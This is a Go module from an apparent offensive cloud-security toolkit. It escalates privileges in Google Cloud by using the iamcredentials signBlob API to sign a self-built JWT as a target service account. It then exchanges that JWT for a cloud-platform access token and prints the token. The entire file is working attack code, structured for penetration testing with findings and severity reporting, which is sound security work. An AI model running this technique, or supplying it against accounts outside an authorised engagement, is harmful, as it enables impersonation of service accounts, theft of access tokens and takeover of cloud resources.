package iam

import (
	"context"
	"encoding/base64"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"time"

	iamcredentials "google.golang.org/api/iamcredentials/v1"

	"github.com/user/nimbus/internal/module"
	"github.com/user/nimbus/internal/output"
)

func init() {
	module.Register(&EscalateSignBlob{})
}

// EscalateSignBlob signs a self-created JWT using signBlob, then exchanges it for an access token.
type EscalateSignBlob struct{}

func (m *EscalateSignBlob) Info() module.Info {
	return module.Info{
		Name:         "privesc.iam.escalate-sign-blob",
		Tactic:       module.TacticPrivesc,
		Service:      "iam",
		Description:  "Sign a JWT via signBlob and exchange it for an access token",
		RequiresAuth: true,
	}
}

func (m *EscalateSignBlob) Run(ctx module.RunContext) error {
	targetSA := ctx.Flags["target-sa"]
	if targetSA == "" {
		output.Warn("Usage: run privesc.iam.escalate-sign-blob --target-sa <service-account-email>")
		output.Info("Tip: run 'recon.iam.list-principals' first to discover service accounts.")
		return nil
	}

	svc, err := iamcredentials.NewService(context.Background(), ctx.Session.ClientOption())
	if err != nil {
		return fmt.Errorf("create iamcredentials client: %w", err)
	}

	output.Info("Building JWT for %s", targetSA)

	now := time.Now()
	iat := now.Unix()
	exp := now.Add(time.Hour).Unix()

	// Build JWT header and payload.
	header := base64URLEncode([]byte(`{"alg":"RS256","typ":"JWT"}`))
	payload := base64URLEncode([]byte(fmt.Sprintf(
		`{"iss":"%s","scope":"https://www.googleapis.com/auth/cloud-platform","aud":"https://oauth2.googleapis.com/token","iat":%d,"exp":%d}`,
		targetSA, iat, exp,
	)))
	unsigned := header + "." + payload

	output.Info("Signing JWT blob via iamcredentials.signBlob")

	signResp, err := svc.Projects.ServiceAccounts.SignBlob(
		fmt.Sprintf("projects/-/serviceAccounts/%s", targetSA),
		&iamcredentials.SignBlobRequest{
			Payload: base64.StdEncoding.EncodeToString([]byte(unsigned)),
		},
	).Do()
	if err != nil {
		return fmt.Errorf("signBlob failed: %w", err)
	}

	// signBlob returns base64-encoded signature; decode and re-encode as base64url.
	sigBytes, err := base64.StdEncoding.DecodeString(signResp.SignedBlob)
	if err != nil {
		return fmt.Errorf("decode signed blob: %w", err)
	}
	signature := base64URLEncode(sigBytes)
	signedJWT := unsigned + "." + signature

	output.Info("Exchanging signed JWT for access token")

	// Exchange the signed JWT for an access token.
	tokenResp, err := http.PostForm("https://oauth2.googleapis.com/token", url.Values{
		"grant_type": {"urn:ietf:params:oauth:grant-type:jwt-bearer"},
		"assertion":  {signedJWT},
	})
	if err != nil {
		return fmt.Errorf("token exchange request failed: %w", err)
	}
	defer tokenResp.Body.Close()

	body, err := io.ReadAll(tokenResp.Body)
	if err != nil {
		return fmt.Errorf("read token response: %w", err)
	}

	if tokenResp.StatusCode != http.StatusOK {
		return fmt.Errorf("token exchange failed (HTTP %d): %s", tokenResp.StatusCode, string(body))
	}

	output.Success("Access token obtained for %s via signBlob", targetSA)

	if ctx.Verbose {
		fmt.Printf("\n  Token Response: %s\n\n", string(body))
	} else {
		// Print a truncated preview.
		preview := string(body)
		if len(preview) > 80 {
			preview = preview[:80] + "..."
		}
		output.Info("Response: %s", preview)
	}

	if ctx.Findings != nil {
		ctx.Findings <- module.Finding{
			Module:      "privesc.iam.escalate-sign-blob",
			Severity:    module.SevCritical,
			Title:       "Obtained access token via signBlob JWT signing",
			Description: fmt.Sprintf("Signed a JWT as %s using signBlob and exchanged it for an access token", targetSA),
			Resource:    targetSA,
		}
	}

	return nil
}

func base64URLEncode(data []byte) string {
	return strings.TrimRight(base64.URLEncoding.EncodeToString(data), "=")
}
